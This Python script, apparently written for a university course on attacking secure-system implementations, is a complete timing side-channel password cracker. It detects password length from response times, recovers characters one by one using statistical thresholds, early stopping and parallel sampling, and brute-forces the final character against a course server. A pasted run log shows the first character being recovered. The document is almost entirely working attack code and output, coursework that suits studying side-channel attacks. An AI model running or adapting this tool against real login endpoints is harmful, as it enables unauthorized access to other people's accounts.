#!/usr/bin/env python3
"""
Timing Side-Channel Attack - single-file implementation

Course: Attacks on Implementations of Secure Systems
Student ID: 316279942

WHAT THIS CODE DOES
-------------------
This script performs a timing side-channel attack against a vulnerable
password-checking endpoint:

  1) Phase 1 - Length Detection:
       Sends padded guesses of different lengths and picks the length
       with the longest average response time.

  2) Phase 2 - Character Cracking:
       For each position, tests candidate characters and uses timing
       differences to find the correct one.
       Supports:
         - Early-stop heuristic (stop once a strong winner emerges)
         - Adaptive 2+3 sampling strategy (coarse + refine on top-K chars)
         - Optional parallel sample collection per candidate

  3) Phase 3 - Last Character Verification:
       Uses the server's functional response (== "1") to find the last
       character. This can safely be parallelized (no timing dependence).

KEY CONCEPTS (DOCUMENTATION)
----------------------------

samples_per_test:
    "We use samples_per_test timing samples per candidate (or total across
     coarse+refine) as a tradeoff between noise reduction and total requests."

    EXAMPLE: samples_per_test=4
      Position 1: Test 'a' → [0.551s, 0.550s, 0.552s, 0.549s] → avg=0.550s
      Position 1: Test 'b' → [0.552s, 0.551s, 0.550s, 0.553s] → avg=0.551s
      More samples = less noise, but more requests to server.

enable_early_stop:
    "We allow early termination of per-position search when a clear timing
     winner emerges, reducing average complexity."

    EXAMPLE: Without early_stop, we test all 26 letters. With early_stop:
      Test 'a': 0.550s (mean)
      Test 'b': 0.551s (mean)
      Test 'w': 0.788s (mean)  ← HUGE gap detected! Stop here instead of testing x,y,z
      Result: Saved 3 requests by recognizing 'w' is clearly the winner.

min_samples_for_decision:
    "We require at least this many timing samples (across tested chars) before
     allowing early-stop, to avoid decisions on pure noise."

    EXAMPLE: min_samples_for_decision=4
      After testing 'a','b','c': only 12 total samples → DON'T early-stop yet
      After testing 'a','b','c','d': 16 total samples → NOW we can trust early-stop

delta_safety_factor:
    "We demand the observed timing advantage is at least this fraction
     (e.g. 0.6 = 60%) of our historical per-character gap estimate
     (estimated_step) to be considered trustworthy."

    EXAMPLE: delta_safety_factor=0.6, estimated_step=0.25s
      Candidate timing gap = 0.15s
      Required threshold = 0.6 * 0.25s = 0.15s
      0.15s >= 0.15s? YES → Trusted winner! Early stop.

      If gap was 0.12s:
      0.12s >= 0.15s? NO → Too small compared to history. Keep testing.

min_sigma_multiplier:
    "We additionally require the candidate to be ≥ this many standard deviations
     above the mean (e.g. 3.0 = classic 3σ) as a robust threshold against jitter."

    EXAMPLE: min_sigma_multiplier=3.0
      Samples: [0.55s, 0.54s, 0.56s, 0.53s]
      mean = 0.545s, sigma = 0.012s
      3σ threshold = 3.0 * 0.012s = 0.036s
      Best candidate at 0.787s → gap = 0.787 - 0.545 = 0.242s
      0.242s >= 0.036s? YES → Statistical outlier, strong winner!

estimated_step:
    An exponential moving average (EMA) of the observed timing gap:

    EXAMPLE: ema_alpha=0.5
      Position 1: observed_gap = 0.237s
        estimated_step = 0.5 * 0.237 + 0.5 * 0.0 = 0.1185s

      Position 2: observed_gap = 0.241s
        estimated_step = 0.5 * 0.241 + 0.5 * 0.1185 = 0.1797s

      Position 3: observed_gap = 0.251s
        estimated_step = 0.5 * 0.251 + 0.5 * 0.1797 = 0.2154s

      This value grows as we solve more positions, encoding "how much slower
      each extra correct character makes the request."

threshold (for early-stop):
    For currently tested samples at a position:
        mu = mean(times_seen)
        sigma = std(times_seen)
        noise_threshold    = min_sigma_multiplier * sigma
        history_threshold  = delta_safety_factor * estimated_step (if known)
        threshold          = max(noise_threshold, history_threshold)

    If (best_time - mu) >= threshold, we consider that candidate a strong enough
    winner to accept early.

    EXAMPLE: At position 5, min_sigma_multiplier=3.0, delta_safety_factor=0.6
      Times sampled so far: [1.78, 1.54, 1.54, 1.53]
      mu = 1.595s, sigma = 0.11s
      noise_threshold = 3.0 * 0.11s = 0.33s
      history_threshold = 0.6 * 0.243s = 0.146s (from position 4)
      threshold = max(0.33s, 0.146s) = 0.33s

      Best candidate so far: 1.78s
      Gap from mean: 1.78 - 1.595 = 0.185s
      0.185s >= 0.33s? NO → Keep testing

      But if best was 1.93s:
      Gap = 1.93 - 1.595 = 0.335s
      0.335s >= 0.33s? YES → Early stop!

RUN LOGGING
-----------
Each run writes a unique JSON-lines log file under logs/:
    logs/attack_run_{UTC_ISO}.log

It contains:
    - run_start: config + timestamp
    - position: per-position details (chosen char, thresholds, timings)
    - run_end / run_interrupt / run_error: summary with elapsed time & requests

You can inspect these logs to tune parameters and justify your attack.
"""

import time
import logging
import requests
import json
import os
import signal
from dataclasses import dataclass
from typing import Dict, Optional, List, Tuple
from datetime import datetime, timezone
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed


# ============================================================================
# Configuration
# ============================================================================

@dataclass
class AttackConfig:
    """Configuration parameters for the timing attack."""

    # ----- TARGET SETTINGS -----
    base_url: str = "http://127.0.0.1/"    # change to remote for server attack
    user_name: str = "316279942"
    difficulty: int = 1

    # ----- ATTACK SETTINGS -----
    max_password_length: int = 32
    charset: str = "abcdefghijklmnopqrstuvwxyz"

    # For each candidate character, how many timing samples to use
    # (or total after coarse+refine).
    samples_per_test: int = 4
    # EXAMPLE: 4 samples per letter means ~104 requests per position (4 * 26 letters)
    # Higher = less noise, lower = fewer total requests

    # Early-stop: allow exiting position search once a strong winner appears.
    enable_early_stop: bool = True
    # EXAMPLE: Without this, test all 26 letters every position (~416 requests/position)
    # With this, might stop after testing 10-15 letters (~40-60 requests/position)

    # Require at least this many samples (across tested chars) before early-stop:
    min_samples_for_decision: int = 4
    # EXAMPLE: min_samples_for_decision=4 means: only allow early-stop after testing
    # at least 4 different letters (with their samples). Prevents lucky guesses.

    # Historical gap factor:
    delta_safety_factor: float = 0.6
    # EXAMPLE: If typical gap per position is 0.25s, require 60% of that = 0.15s gap
    # to early-stop. More conservative = more tests, but safer decisions.

    # Noise-based factor:
    min_sigma_multiplier: float = 3.0
    # EXAMPLE: If noise level is 0.01s (1σ), require 3σ = 0.03s gap to declare winner
    # Higher = stricter, needs very obvious winner to stop.

    # EMA smoothing for estimated_step (weights recent observations more)
    ema_alpha: float = 0.5
    # EXAMPLE: alpha=0.5 = equal weight to new observation and history
    # alpha=0.9 = trust recent observations more, adapt quickly
    # alpha=0.1 = trust history more, stable but slow to adapt

    # ----- Adaptive ranking (coarse + refine) -----
    # Two-phase strategy: cheap screening, then deep dive on top candidates
    enable_adaptive_ranking: bool = True
    coarse_samples: int = 2      # cheap initial samples per char (coarse)
    # EXAMPLE: coarse_samples=2 → fast first pass over all 26 letters (~52 requests)
    refine_samples: int = 2      # extra samples for top_k candidates
    # EXAMPLE: refine_samples=2 → zoom in on top 4 with 2 more samples each (~8 requests)
    # Total: ~60 requests vs ~104 for uniform sampling. 40% time saved!
    top_k: int = 4               # number of top candidates to refine
    # EXAMPLE: top_k=4 means keep the 4 fastest letters from coarse phase for refinement

    # ----- Parallel options -----
    # Parallelize sample collection per candidate (safe if server concurrency is good).
    enable_parallel_samples: bool = False
    # WARNING: Parallel samples for TIMING attack can distort measurements!
    # EXAMPLE: Sequential: send 4 requests serially → accurate per-request timing
    #          Parallel (4 workers): send 4 at once → server handles concurrency,
    #          response times include queueing, not just processing!
    # Use your check.py script to verify parallel is safe for YOUR server.
    parallel_workers: int = 8

    # Parallelize final character verification (safe: functional, not timing-based).
    enable_parallel_last_char: bool = True
    # EXAMPLE: Last char is found by functional response (=="1"), NOT timing.
    # So we can safely test all 26 letters in parallel without breaking the attack.
    # This saves ~26 requests → massively speeds up final step.
    parallel_last_workers: int = 26
    parallel_last_batch: int = 26

    # ----- External logging -----
    external_log_dir: str = "logs"
    external_log_template: str = "attack_run_{ts}.log"

    def get_test_url(self, password: str) -> str:
        return f"{self.base_url}?user={self.user_name}&password={password}&difficulty={self.difficulty}"


# ============================================================================
# Logging wrapper
# ============================================================================

class AttackLogger:
    def __init__(self, level=logging.INFO):
        self.logger = logging.getLogger("TimingAttack")
        self.logger.setLevel(level)
        if not self.logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(level)
            fmt = logging.Formatter(
                "%(asctime)s | %(levelname)-8s | %(message)s",
                datefmt="%H:%M:%S"
            )
            ch.setFormatter(fmt)
            self.logger.addHandler(ch)

    def info(self, msg: str): self.logger.info(msg)
    def debug(self, msg: str): self.logger.debug(msg)
    def warning(self, msg: str): self.logger.warning(msg)
    def error(self, msg: str): self.logger.error(msg)

    @staticmethod
    def print_separator(char: str = "=", length: int = 80):
        print(char * length)

    def print_header(self, text: str):
        self.print_separator("=")
        print(f"  {text}")
        self.print_separator("=")

    def print_section(self, text: str):
        self.print_separator("-")
        print(f"  {text}")
        self.print_separator("-")


# ============================================================================
# Request Handler (Session + thread-safe counter)
# ============================================================================

class RequestHandler:
    def __init__(self, logger: AttackLogger):
        self.logger = logger
        self.session = requests.Session()
        self._lock = Lock()
        self.total_requests = 0
        self.start_time: Optional[float] = None  # set by orchestrator

    def send_request(self, url: str, timeout: float = 10.0) -> requests.Response:
        with self._lock:
            self.total_requests += 1
        try:
            resp = self.session.get(url, timeout=timeout)
            return resp
        except requests.RequestException as e:
            self.logger.error(f"Request failed: {e}")
            raise

    def measure_timing(self, url: str, samples: int) -> float:
        total = 0.0
        for _ in range(samples):
            r = self.send_request(url)
            total += r.elapsed.total_seconds()
        return total / samples

    def get_request_count(self) -> int:
        with self._lock:
            return self.total_requests


# ============================================================================
# Phase 1: Password Length Detection
# ============================================================================

class PasswordLengthDetector:
    def __init__(self, config: AttackConfig, rh: RequestHandler, logger: AttackLogger):
        self.config = config
        self.rh = rh
        self.logger = logger

    def detect_length(self) -> int:
        self.logger.print_section("PHASE 1: Password Length Detection")
        timing_data: Dict[int, float] = {}

        for length in range(1, self.config.max_password_length + 1):
            pw = "a" * length
            url = self.config.get_test_url(pw)
            avg = self.rh.measure_timing(url, self.config.samples_per_test)
            timing_data[length] = avg
            self.logger.debug(f"Length {length:2d}: {avg:.6f}s")

        detected = max(timing_data, key=timing_data.get)
        self.logger.info(f"✓ Detected password length: {detected} characters")
        self._print_timing_summary(timing_data, detected)
        return detected

    @staticmethod
    def _print_timing_summary(timing_data: Dict[int, float], detected: int):
        print("\n  Top 5 Candidates by Response Time:")
        sorted_l = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        for i, (length, t) in enumerate(sorted_l[:5], 1):
            mark = "◄ SELECTED" if length == detected else ""
            print(f"    {i}. Length {length:2d}: {t:.6f}s {mark}")


# ============================================================================
# Phase 2: Character Cracker (with adaptive ranking & parallel support)
# ============================================================================

class CharacterCracker:
    def __init__(self, config: AttackConfig, rh: RequestHandler, logger: AttackLogger, run_logger):
        self.config = config
        self.rh = rh
        self.logger = logger
        self.run_logger = run_logger  # function to write per-position JSON lines
        self.estimated_step: Optional[float] = None  # EMA of timing gap

    # ----- duration formatting -----
    @staticmethod
    def _format_duration(seconds: float) -> str:
        """
        Format as Xm YY.YYs while keeping raw seconds outside:
        Example: 101.06 -> "1m 41.06s"
        """
        minutes = int(seconds // 60)
        rem = seconds - minutes * 60
        return f"{minutes}m {rem:05.2f}s"

    # ----- simple stats -----
    @staticmethod
    def _mean(xs: List[float]) -> float:
        return sum(xs) / len(xs) if xs else 0.0

    @staticmethod
    def _std(xs: List[float]) -> float:
        n = len(xs)
        if n < 2:
            return 0.0
        mu = CharacterCracker._mean(xs)
        var = sum((x - mu) ** 2 for x in xs) / (n - 1)
        return var ** 0.5

    # ----- sample collection -----
    def _collect_samples_sequential(self, url: str, n: int) -> Tuple[float, List[float]]:
        total = 0.0
        samples: List[float] = []
        for _ in range(n):
            r = self.rh.send_request(url)
            t = r.elapsed.total_seconds()
            total += t
            samples.append(t)
        return total, samples

    def _collect_samples_parallel(self, url: str, n: int) -> Tuple[float, List[float]]:
        workers = min(self.config.parallel_workers, n)
        total = 0.0
        samples: List[float] = []
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = [ex.submit(self.rh.send_request, url) for _ in range(n)]
            for fut in as_completed(futures):
                try:
                    r = fut.result()
                    t = r.elapsed.total_seconds()
                    total += t
                    samples.append(t)
                except Exception as e:
                    self.logger.error(f"Sample request error: {e}")
                    total += 10.0
                    samples.append(10.0)
        return total, samples

    def _collect_samples(self, url: str, n: int) -> Tuple[float, List[float]]:
        if self.config.enable_parallel_samples and n > 1:
            return self._collect_samples_parallel(url, n)
        else:
            return self._collect_samples_sequential(url, n)

    # ----- early-stop decision -----
    def _should_early_stop(self, times_seen: List[float], best_time: float) -> Tuple[bool, float, float, float]:
        n = len(times_seen)
        if n < self.config.min_samples_for_decision:
            return False, 0.0, 0.0, 0.0

        mu = self._mean(times_seen)
        sigma = self._std(times_seen)
        gap = best_time - mu

        noise_threshold = self.config.min_sigma_multiplier * sigma
        history_threshold = (
            self.config.delta_safety_factor * self.estimated_step
            if (self.estimated_step is not None and self.estimated_step > 0)
            else 0.0
        )
        threshold = max(noise_threshold, history_threshold)

        return (gap >= threshold), threshold, mu, sigma

    def _update_step_estimate(self, timing_data: Dict[str, float], best_char: str):
        if best_char not in timing_data:
            return
        best_time = timing_data[best_char]
        others = [t for c, t in timing_data.items() if c != best_char]
        if not others:
            return
        mean_others = self._mean(others)
        delta = best_time - mean_others
        if delta <= 0:
            return

        if self.estimated_step is None:
            self.estimated_step = delta
        else:
            alpha = self.config.ema_alpha
            self.estimated_step = alpha * delta + (1 - alpha) * self.estimated_step

        self.logger.debug(f"Updated estimated_step: {self.estimated_step:.6f}s")

    # ----- adaptive ranking: coarse + refine -----
    def _adaptive_ranking_crack(
        self, prefix: str, total_len: int, position: int
    ) -> Tuple[str, Dict[str, float], int, bool, float]:
        timing_data: Dict[str, float] = {}
        per_char_samples: Dict[str, List[float]] = {}

        coarse_n = min(self.config.coarse_samples, self.config.samples_per_test)
        refine_n = max(0, self.config.refine_samples)
        # ensure total doesn't exceed samples_per_test strongly if you care; here we allow more as strategy

        # Phase 1: coarse over all chars
        for ch in self.config.charset:
            pw = self._build_test_password(prefix, ch, total_len)
            url = self.config.get_test_url(pw)
            _, samples = self._collect_samples(url, coarse_n)
            per_char_samples[ch] = samples[:]
            avg = self._mean(samples) if samples else float("-inf")
            timing_data[ch] = avg

        # pick top_k candidates
        sorted_coarse = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        candidates = [c for c, _ in sorted_coarse[: self.config.top_k]]

        # Phase 2: refine only top_k
        for ch in candidates:
            pw = self._build_test_password(prefix, ch, total_len)
            url = self.config.get_test_url(pw)
            _, extra = self._collect_samples(url, refine_n)
            per_char_samples[ch].extend(extra)
            timing_data[ch] = self._mean(per_char_samples[ch])

        # determine best_char
        best_char = max(timing_data, key=timing_data.get)

        # aggregate all samples for early-stop style analysis
        all_seen: List[float] = []
        for s in per_char_samples.values():
            all_seen.extend(s)

        tested_letters = len(per_char_samples)
        early_stopped, threshold, _, _ = self._should_early_stop(all_seen, timing_data[best_char])
        return best_char, timing_data, tested_letters, early_stopped, threshold

    # ----- full scan fallback -----
    def _full_scan_crack(
        self, prefix: str, total_len: int, position: int
    ) -> Tuple[str, Dict[str, float], int, bool, float]:
        timing_data: Dict[str, float] = {}
        times_seen: List[float] = []
        best_char = None
        best_time = float("-inf")

        for ch in self.config.charset:
            pw = self._build_test_password(prefix, ch, total_len)
            url = self.config.get_test_url(pw)
            _, samples = self._collect_samples(url, self.config.samples_per_test)
            avg = self._mean(samples) if samples else float("-inf")
            timing_data[ch] = avg
            times_seen.extend(samples)

            if avg > best_time:
                best_time = avg
                best_char = ch

            if self.config.enable_early_stop:
                should_stop, threshold, _, _ = self._should_early_stop(times_seen, best_time)
                if should_stop:
                    tested_letters = len(timing_data)
                    return best_char, timing_data, tested_letters, True, threshold

        tested_letters = len(timing_data)
        return best_char, timing_data, tested_letters, False, 0.0

    # ----- public position cracker -----
    def crack_position(self, prefix: str, total_len: int, position: int) -> str:
        pos_start = time.time()
        self.logger.info(f"Testing position {position}/{total_len}...")

        if self.config.enable_adaptive_ranking:
            best_char, timing_data, tested_letters, early_stopped, threshold = \
                self._adaptive_ranking_crack(prefix, total_len, position)
        else:
            best_char, timing_data, tested_letters, early_stopped, threshold = \
                self._full_scan_crack(prefix, total_len, position)

        # Update global timing step estimate
        self._update_step_estimate(timing_data, best_char)

        pos_elapsed = time.time() - pos_start
        global_start = self.rh.start_time
        total_elapsed = (time.time() - global_start) if global_start else pos_elapsed

        # Logging (human)
        letter_time_str = self._format_duration(pos_elapsed)
        total_time_str = self._format_duration(total_elapsed)
        est_step_str = f"{self.estimated_step:.6f}s" if self.estimated_step is not None else "N/A"

        if self.config.enable_early_stop:
            self.logger.info(
                f"Position {position}: tested {tested_letters} letters "
                f"(early_stop={'YES' if early_stopped else 'NO'}), "
                f"estimated_step={est_step_str}, threshold_used={threshold:.6f}s, "
                f"letter_time={letter_time_str} ({pos_elapsed:.2f}s), "
                f"total_elapsed={total_time_str} ({total_elapsed:.2f}s)"
            )
        else:
            self.logger.info(
                f"Position {position}: tested {tested_letters} letters "
                f"(early_stop=DISABLED), estimated_step={est_step_str}, "
                f"letter_time={letter_time_str} ({pos_elapsed:.2f}s), "
                f"total_elapsed={total_time_str} ({total_elapsed:.2f}s)"
            )

        self._print_position_results(timing_data, best_char, position)

        # Logging (JSON to run log)
        try:
            record = {
                "position": position,
                "prefix": prefix,
                "best_char": best_char,
                "tested_letters": tested_letters,
                "early_stopped": bool(early_stopped),
                "threshold": threshold,
                "estimated_step": self.estimated_step,
                "position_elapsed_seconds": pos_elapsed,
                "total_elapsed_seconds": total_elapsed,
                "top_candidates": [
                    {"char": c, "avg_time": float(t)}
                    for c, t in sorted(
                        timing_data.items(), key=lambda x: x[1], reverse=True
                    )[:5]
                ],
            }
            self.run_logger(record)
        except Exception:
            pass

        return best_char

    # ----- utils -----
    @staticmethod
    def _build_test_password(prefix: str, ch: str, total_length: int) -> str:
        rem = total_length - len(prefix) - 1
        return prefix + ch + ("a" * max(0, rem))

    @staticmethod
    def _print_position_results(timing_data: Dict[str, float], best: str, position: int):
        if not timing_data:
            return
        sorted_chars = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        best_time = timing_data[best]
        print(f"\n  Top candidates for position {position}:")
        for i, (ch, t) in enumerate(sorted_chars[:5], 1):
            diff = t - best_time
            mark = "◄ SELECTED" if ch == best else ""
            print(f"    {i}. '{ch}': {t:.6f}s (Δ {diff:+.6f}s) {mark}")


# ============================================================================
# Phase 3: Last Character Verifier (parallel-safe)
# ============================================================================

class LastCharacterVerifier:
    def __init__(self, config: AttackConfig, rh: RequestHandler, logger: AttackLogger):
        self.config = config
        self.rh = rh
        self.logger = logger

    def verify_last_char(self, prefix: str) -> Optional[str]:
        self.logger.print_section(
            f"PHASE 3: Last Character Verification (Position {len(prefix) + 1})"
        )
        chars = list(self.config.charset)

        if not self.config.enable_parallel_last_char:
            # Sequential, simple
            for ch in chars:
                url = self.config.get_test_url(prefix + ch)
                resp = self.rh.send_request(url)
                if resp.text.strip() == "1":
                    self.logger.info(f"✓ Found correct last character: '{ch}'")
                    return ch
            self.logger.warning("✗ No correct last character found")
            return None

        # Parallel fan-out in batches (safe: based on correctness, not timing)
        batch_size = max(1, min(len(chars), self.config.parallel_last_batch))
        for i in range(0, len(chars), batch_size):
            batch = chars[i : i + batch_size]
            workers = min(self.config.parallel_last_workers, len(batch))
            with ThreadPoolExecutor(max_workers=workers) as ex:
                future_map = {
                    ex.submit(self.rh.send_request, self.config.get_test_url(prefix + c)): c
                    for c in batch
                }
                for fut in as_completed(future_map):
                    ch = future_map[fut]
                    try:
                        resp = fut.result()
                    except Exception as e:
                        self.logger.error(f"Error verifying '{ch}': {e}")
                        continue
                    if resp.text.strip() == "1":
                        self.logger.info(f"✓ Found correct last character: '{ch}'")
                        return ch

        self.logger.warning("✗ No correct last character found")
        return None


# ============================================================================
# Orchestrator
# ============================================================================

class PasswordCracker:
    def __init__(self, config: AttackConfig, logger: AttackLogger, run_log_path: str):
        self.config = config
        self.logger = logger
        self.run_log_path = run_log_path
        self.rh = RequestHandler(logger)

        # Per-position log writer
        def run_logger(obj: dict):
            try:
                with open(self.run_log_path, "a", encoding="utf-8") as f:
                    f.write(json.dumps(
                        {
                            "type": "position",
                            "ts": datetime.now(timezone.utc).isoformat(),
                            **obj,
                        },
                        ensure_ascii=False
                    ) + "\n")
            except Exception:
                pass

        self.char_cracker = CharacterCracker(config, self.rh, logger, run_logger)
        self.length_detector = PasswordLengthDetector(config, self.rh, logger)
        self.last_verifier = LastCharacterVerifier(config, self.rh, logger)

    @staticmethod
    def _format_duration(seconds: float) -> str:
        minutes = int(seconds // 60)
        rem = seconds - minutes * 60
        return f"{minutes}m {rem:05.2f}s"

    def crack_from_scratch(self) -> str:
        start = time.time()
        self.rh.start_time = start

        # Header + configuration
        self.logger.print_header("TIMING SIDE-CHANNEL PASSWORD CRACKER")
        print("  Running with configuration:")
        for k, v in vars(self.config).items():
            print(f"    {k}: {v}")
        print()

        # Log run_start
        run_start = {
            "type": "run_start",
            "ts": datetime.now(timezone.utc).isoformat(),
            "config": vars(self.config),
        }
        with open(self.run_log_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(run_start, ensure_ascii=False) + "\n")

        # Phase 1: length
        length = self.length_detector.detect_length()

        # Phase 2: characters
        self.logger.print_section("PHASE 2: Character Position Cracking")
        password = ""
        for pos in range(1, length + 1):
            if pos == length:
                # last character - verify functionally
                last = self.last_verifier.verify_last_char(password)
                if last:
                    password += last
                break
            ch = self.char_cracker.crack_position(password, length, pos)
            password += ch
            self.logger.info(
                f"✓ Password progress: '{password}' ({len(password)}/{length})"
            )
            print()

        # Final stats
        elapsed = time.time() - start
        total_requests = self.rh.get_request_count()
        self.logger.print_header("ATTACK COMPLETE")
        print(f"  ✓ CRACKED PASSWORD: '{password}'")
        print(f"  ⏱ Total Time: {self._format_duration(elapsed)} ({elapsed:.2f}s)")
        print(f"  📊 Total Requests: {total_requests}")
        if total_requests > 0:
            print(
                f"  ⚡ Avg Time per Request: {elapsed / total_requests:.4f}s"
            )
        self.logger.print_separator("=")

        # Log run_end summary (external log, timestamped)
        run_end = {
            "type": "run_end",
            "ts": datetime.now(timezone.utc).isoformat(),
            "result": {"password": password},
            "elapsed_seconds": elapsed,
            "elapsed_human": self._format_duration(elapsed),
            "total_requests": total_requests,
            "config": vars(self.config),
        }
        with open(self.run_log_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(run_end, ensure_ascii=False) + "\n")

        return password

    def verify_password(self, password: str) -> bool:
        url = self.config.get_test_url(password)
        resp = self.rh.send_request(url)
        ok = resp.text.strip() == "1"
        self.logger.info(f"Password verification: {'✓ CORRECT' if ok else '✗ INCORRECT'}")
        self.logger.debug(
            f"Response time: {resp.elapsed.total_seconds():.6f}s"
        )
        return ok


# ============================================================================
# Helpers
# ============================================================================

def make_run_log_path(log_dir: str, template: str) -> str:
    """
    Create a unique timestamped log file path per run.

    Uses timezone-aware UTC timestamps to avoid DeprecationWarning and
    to make filenames unique and Windows-safe.
    """
    ts = datetime.now(timezone.utc).isoformat(timespec="seconds").replace(":", "-")
    os.makedirs(log_dir, exist_ok=True)
    return os.path.join(log_dir, template.format(ts=ts))


# ============================================================================
# Main
# ============================================================================

def main():
    # ----------------------------------------------------------------------
    # CONFIG RUNTIME OVERRIDES
    # ----------------------------------------------------------------------
    # Quick guide to tuning for your attack scenario:
    #
    # AGGRESSIVE (fast, may miss correct char):
    #   samples_per_test=3, min_samples_for_decision=2, min_sigma_multiplier=2.0
    #   → ~300 requests for 16-char password
    #
    # BALANCED (recommended for noisy networks):
    #   samples_per_test=6, min_samples_for_decision=4, min_sigma_multiplier=3.0
    #   → ~600 requests for 16-char password
    #
    # CONSERVATIVE (slow, very reliable):
    #   samples_per_test=12, min_samples_for_decision=6, min_sigma_multiplier=3.5
    #   → ~1200 requests for 16-char password
    #
    # Detailed parameter explanations:
    #
    # samples_per_test=4:
    #   We use 4 samples per candidate as an initial tradeoff between
    #   noise reduction and total number of requests.
    #
    # enable_early_stop=True:
    #   We allow early termination of per-position search when a clear
    #   timing winner emerges, reducing average complexity.
    #
    # min_samples_for_decision=4:
    #   We require at least 4 measurements (across tested chars) before
    #   allowing early-stop, to avoid decisions on pure noise.
    #
    # delta_safety_factor=0.6:
    #   We demand the observed timing advantage is at least 60% of our
    #   historical per-character gap estimate (estimated_step) to be
    #   considered trustworthy.
    #
    # min_sigma_multiplier=3.0:
    #   We additionally require the candidate to be ≥3σ above the mean
    #   as a robust threshold against random jitter.
    #
    # Parallel toggles should be enabled only after confirming via
    # micro-benchmarks that parallel requests don't destroy the timing signal.
    # Run check.py FIRST to validate your setup!
    # ----------------------------------------------------------------------

    config = AttackConfig(
        base_url="http://aoi-assignment1.oy.ne.ro:8080/",  # remote server or "http://127.0.0.1/"
        user_name="316279942",
        difficulty=1,

        samples_per_test=12,
        enable_early_stop=True,
        min_samples_for_decision=4,
        delta_safety_factor=0.6,
        min_sigma_multiplier=3.0,

        enable_adaptive_ranking=False,
        coarse_samples=2,
        refine_samples=2,
        top_k=4,

        enable_parallel_samples=True,   # enable after your checker shows it's safe
        parallel_workers=12,
        enable_parallel_last_char=True,
        parallel_last_workers=26,
        parallel_last_batch=26
    )

    logger = AttackLogger(level=logging.INFO)
    run_log_path = make_run_log_path(config.external_log_dir, config.external_log_template)
    cracker = PasswordCracker(config, logger, run_log_path)

    # Handle Ctrl+C cleanly and log interruption
    def handle_sigint(sig, frame):
        raise KeyboardInterrupt()

    signal.signal(signal.SIGINT, handle_sigint)

    start = time.time()
    try:
        cracked = cracker.crack_from_scratch()
        print()
        logger.print_section("FINAL VERIFICATION")
        cracker.verify_password(cracked)

    except KeyboardInterrupt:
        elapsed = time.time() - start
        interrupt_record = {
            "type": "run_interrupt",
            "ts": datetime.now(timezone.utc).isoformat(),
            "elapsed_seconds": elapsed,
            "elapsed_human": cracker._format_duration(elapsed),
            "total_requests": cracker.rh.get_request_count(),
        }
        with open(run_log_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(interrupt_record, ensure_ascii=False) + "\n")
        logger.warning("Interrupted by user. Partial run written to log.")

    except Exception as e:
        elapsed = time.time() - start
        error_record = {
            "type": "run_error",
            "ts": datetime.now(timezone.utc).isoformat(),
            "elapsed_seconds": elapsed,
            "elapsed_human": cracker._format_duration(elapsed),
            "total_requests": cracker.rh.get_request_count(),
            "error": str(e),
        }
        with open(run_log_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(error_record, ensure_ascii=False) + "\n")
        logger.error(f"Unhandled exception: {e}")
        raise

    else:
        logger.info(f"Run complete. Detailed log saved to: {run_log_path}")


if __name__ == "__main__":
    main()


# tacks/Atcks Drill 1/Timing_Side_Channel_Attack.py"
# c:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1\Timing_Side_Channel_Attack.py:620: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
#   ts = datetime.utcnow().replace(tzinfo=timezone.utc).isoformat(timespec="seconds").replace(":", "-")
# ================================================================================
#   TIMING SIDE-CHANNEL PASSWORD CRACKER
# ================================================================================
#   Running with configuration:
#     base_url: http://aoi-assignment1.oy.ne.ro:8080/
#     user_name: 316279942
#     difficulty: 1
#     max_password_length: 32
#     charset: abcdefghijklmnopqrstuvwxyz
#     samples_per_test: 4
#     enable_early_stop: True
#     min_samples_for_decision: 4
#     delta_safety_factor: 0.6
#     min_sigma_multiplier: 3.0
#     ema_alpha: 0.5
#     enable_adaptive_ranking: False
#     coarse_samples: 2
#     refine_samples: 3
#     top_k: 4
#     enable_parallel_samples: True
#     parallel_workers: 12
#     enable_parallel_last_char: True
#     parallel_last_workers: 26
#     parallel_last_batch: 26
#     external_log_dir: logs
#     external_log_template: attack_run_{ts}.log

# c:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1\Timing_Side_Channel_Attack.py:558: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
#   "ts": datetime.utcnow().isoformat() + "Z",
# --------------------------------------------------------------------------------
#   PHASE 1: Password Length Detection
# --------------------------------------------------------------------------------
# 17:20:08 | INFO     | ✓ Detected password length: 16 characters

#   Top 5 Candidates by Response Time:
#     1. Length 16: 0.540906s ◄ SELECTED
#     2. Length  1: 0.035379s
#     3. Length 28: 0.020103s
#     4. Length 13: 0.019649s
#     5. Length  4: 0.019161s
# --------------------------------------------------------------------------------
#   PHASE 2: Character Position Cracking
# --------------------------------------------------------------------------------
# 17:20:08 | INFO     | Testing position 1/16...
# 17:20:21 | INFO     | Position 1: tested 23 letters (early_stop=YES), estimated_step=0.247258s, threshold_used=0.153399s, letter_time=0.213 min (12.79s), total_elapsed=0.288 min (17.26s)

#   Top candidates for position 1:
#     1. 'w': 0.787949s (Δ +0.000000s) ◄ SELECTED
#     2. 'm': 0.556694s (Δ -0.231255s)
#     3. 'a': 0.555271s (Δ -0.232678s)
#     4. 't': 0.551176s (Δ -0.236773s)
#     5. 'r': 0.550391s (Δ -0.237558s)
# c:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1\Timing_Side_Channel_Attack.py:533: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
#   f.write(json.dumps({"type": "position", "ts": datetime.utcnow().isoformat() + "Z", **obj}, ensure_ascii=False) + "\n")
# 17:20:21 | INFO     | ✓ Password progress: 'w' (1/16)

# 17:20:21 | INFO     | Testing position 2/16...
